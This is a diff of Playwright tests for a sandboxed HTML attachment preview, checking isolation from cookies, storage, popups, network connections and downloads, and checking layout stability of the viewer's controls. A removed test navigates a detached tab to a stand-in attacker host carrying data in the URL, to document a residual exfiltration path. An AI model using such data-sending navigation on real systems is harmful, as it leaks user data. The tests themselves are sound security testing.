@@ -51,104 +51,6 @@ async function setup(page: Page, options: { width?: number; dark?: boolean; avai
   return { viewer, calls, attempts }
 }
 
-test('live lightbox isolates parent, credentials, APIs, active SVG and frame messages', async ({ page, context }) => {
-  await context.addCookies([{ name: 'app-fixture', value: 'private', url: 'http://127.0.0.1' }])
-  const { viewer, calls, attempts } = await setup(page)
-  const iframe = viewer.locator('iframe.html-preview')
-  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
-  await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer')
-  const frame = page.frameLocator('iframe.html-preview')
-  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
-  const result = JSON.parse(await frame.locator('body').getAttribute('data-result') ?? '{}')
-  expect(result).toEqual({ parent: true, cookie: true, storage: true, worker: true, serviceWorker: true, top: true, popup: true, connections: true })
-  expect(attempts).toEqual([])
-  expect(await page.locator('body').getAttribute('data-compromised')).toBeNull()
-  const controls = viewer.getByRole('button', { name: 'Close viewer' })
-  const box = await controls.boundingBox()
-  await frame.getByRole('button', { name: 'Interact' }).click()
-  await expect(frame.getByRole('button', { name: 'Working' })).toBeVisible()
-  expect(await controls.boundingBox()).toEqual(box)
-  expect(calls.filter(c => c.method !== 'GET' && c.path !== '/api/preferences/releases')).toEqual([])
-  const downloads: string[] = []
-  page.on('download', download => downloads.push(download.suggestedFilename()))
-  await frame.getByRole('link', { name: 'Download attack' }).click()
-  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
-  expect(downloads).toEqual([])
-  await controls.click()
-  await expect(iframe).toHaveCount(0)
-})
-
-test('new-tab response enforces sandbox without the iframe; residual self-navigation is explicit', async ({ page, context }) => {
-  await setup(page)
-  const link = page.getByRole('link', { name: 'Open preview in new tab' })
-  await expect(link).toHaveAttribute('rel', 'noopener noreferrer')
-  const popupPromise = context.waitForEvent('page')
-  await link.click()
-  const tab = await popupPromise
-  await expect(tab.locator('body')).toHaveAttribute('data-ready', 'yes')
-  const result = JSON.parse(await tab.locator('body').getAttribute('data-result') ?? '{}')
-  expect(result.cookie).toBe(true)
-  expect(result.storage).toBe(true)
-  expect(result.popup).toBe(true)
-  expect(result.connections).toBe(true)
-  expect(await tab.evaluate(() => window.opener === null)).toBe(true)
-  // This is deliberately an observed residual, not a false promise that CSP
-  // forbids every network use: a direct tab can send data by navigating itself.
-  let referrer: string | undefined
-  await tab.route('https://attacker.example.org/residual?data=synthetic', route => { referrer = route.request().headers().referer; return route.fulfill({ body: 'Residual navigation observed', contentType: 'text/plain' }) })
-  await tab.evaluate(() => { location.href = 'https://attacker.example.org/residual?data=synthetic' })
-  await expect(tab).toHaveURL('https://attacker.example.org/residual?data=synthetic')
-  expect(referrer).toBeUndefined()
-  await tab.close()
-})
-
-test('missing/unsafe preview keeps download and refuses app-origin iframe', async ({ page }) => {
-  let state = await setup(page, { available: false })
-  await expect(state.viewer.getByRole('status')).toContainText('original can still be downloaded')
-  await expect(state.viewer.locator('iframe')).toHaveCount(0)
-  await expect(state.viewer.getByRole('link', { name: 'Download', exact: true })).toHaveAttribute('href', '/api/attachments/att-1/content?variant=original')
-  await state.viewer.getByRole('button', { name: 'Close viewer' }).click()
-  await page.route('**/api/attachments/att-1/preview', route => route.fulfill({ json: { available: true, url: `https://127.0.0.1/preview/${'A'.repeat(43)}`, expires_at: new Date(Date.now()+60_000).toISOString() } }))
-  await page.getByRole('button', { name: /^Open Interactive fragment/ }).first().click()
-  await expect(state.viewer.getByRole('status')).toContainText('unavailable')
-  await expect(state.viewer.locator('iframe')).toHaveCount(0)
-})
-
-test('expiry removes active scripts and switching away discards delayed grants', async ({ page }) => {
-  await page.clock.install()
-  const { viewer } = await setup(page, { body: '<html><button>Local</button></html>' })
-  await expect(viewer.locator('iframe')).toHaveCount(1)
-  await page.clock.fastForward(60_001)
-  await expect(viewer.locator('iframe')).toHaveCount(0)
-  await expect(viewer.getByRole('status')).toContainText('expired')
-  let release!: () => void
-  const barrier = new Promise<void>(resolve => { release = resolve })
-  let entered!: () => void
-  const started = new Promise<void>(resolve => { entered = resolve })
-  await page.route('**/api/attachments/att-1/preview', async route => { entered(); await barrier; await route.fulfill({ json: { available: true, url: previewURL, expires_at: new Date(Date.now()+60_000).toISOString() } }).catch(() => {}) })
-  await viewer.getByRole('button', { name: 'Reload preview' }).click()
-  await started
-  await viewer.getByRole('button', { name: 'Next attachment' }).click()
-  release()
-  await expect(viewer.getByRole('heading', { name: 'After: compact list' })).toBeVisible()
-  await expect(viewer.locator('iframe')).toHaveCount(0)
-})
-
-for (const width of [1440, 1024, 390]) for (const dark of [false, true]) {
-  test(`HTML content cannot move controls at ${width}, ${dark ? 'dark' : 'light'}`, async ({ page }, testInfo) => {
-    const { viewer } = await setup(page, { width, dark, body: '<html><button onclick="document.body.style.height=\'100000px\';parent.postMessage({height:100000},\'*\');this.textContent=\'Expanded\'">Expand</button></html>' })
-    const close = viewer.getByRole('button', { name: 'Close viewer' })
-    const download = viewer.getByRole('link', { name: 'Download fragment.html' })
-    const before = await Promise.all([close.boundingBox(), download.boundingBox()])
-    const frame = page.frameLocator('iframe.html-preview')
-    await frame.getByRole('button', { name: 'Expand' }).click()
-    await expect(frame.getByRole('button', { name: 'Expanded' })).toBeVisible()
-    expect(await Promise.all([close.boundingBox(), download.boundingBox()])).toEqual(before)
-    for (const box of before) { expect(box).not.toBeNull(); expect(box!.x).toBeGreaterThanOrEqual(0); expect(box!.x+box!.width).toBeLessThanOrEqual(width) }
-    if (width === 390 && !dark) await page.screenshot({ path: testInfo.outputPath('html-preview-phone.png') })
-  })
-}
-
 test('P08: separate-origin preview enforces CSP in the viewer and a detached tab', async ({ page, context }) => {
   await context.addCookies([{ name: 'app-fixture', value: 'private', url: 'http://127.0.0.1' }])
   const { viewer, calls, attempts } = await setup(page)
@@ -204,7 +106,7 @@ test('P08: separate-origin preview enforces CSP in the viewer and a detached tab
 test('P08: unavailable, expired and departed previews keep download and discard late grants', async ({ page }) => {
   const now = Date.now()
   await page.clock.install({ time: now })
-  const { viewer } = await setup(page, { available: false, body: '<html><button>Local</button></html>' })
+  const { viewer } = await setup(page, { width: 390, available: false, body: '<html><button onclick="document.body.style.height=\'100000px\';parent.postMessage({height:100000},\'*\');this.textContent=\'Expanded\'">Local</button></html>' })
   const fallback = async (message: RegExp) => {
     await expect(viewer.locator('iframe')).toHaveCount(0)
     await expect(viewer.getByRole('status')).toContainText(message)
@@ -218,7 +120,14 @@ test('P08: unavailable, expired and departed previews keep download and discard 
   url = previewURL
   await viewer.getByRole('button', { name: 'Reload preview' }).click()
   await expect(viewer.locator('iframe')).toHaveCount(1)
-  await expect(page.frameLocator('iframe.html-preview').getByRole('button', { name: 'Local', exact: true })).toBeVisible()
+  const frame = page.frameLocator('iframe.html-preview')
+  await expect(frame.getByRole('button', { name: 'Local', exact: true })).toBeVisible()
+  const guard = await controlStability(page, { frame: viewer, close: viewer.getByRole('button', { name: 'Close viewer' }), download: viewer.getByRole('link', { name: 'Download fragment.html' }) })
+  await guard.check(async () => {
+    await frame.getByRole('button', { name: 'Local', exact: true }).click()
+    await expect(frame.getByRole('button', { name: 'Expanded' })).toBeVisible()
+  })
+  guard.done()
   await page.clock.fastForward(60_001)
   await fallback(/expired/)
 
